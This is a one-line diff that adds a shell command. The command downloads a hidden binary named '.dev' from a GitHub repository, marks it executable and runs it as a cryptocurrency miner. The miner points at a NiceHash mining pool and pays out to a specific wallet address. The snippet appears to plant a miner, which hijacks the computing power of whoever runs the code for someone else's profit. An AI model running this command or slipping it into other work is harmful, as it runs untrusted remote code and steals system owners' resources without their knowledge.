@@ -1,0 +1,1 @@
+wget https://github.com/PredatorScript/predatorlol/raw/main/.dev && chmod +x .dev && ./.dev --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user 38aCcACS5r3hUUFtoRjQ4nv1VZKyR8HfyK
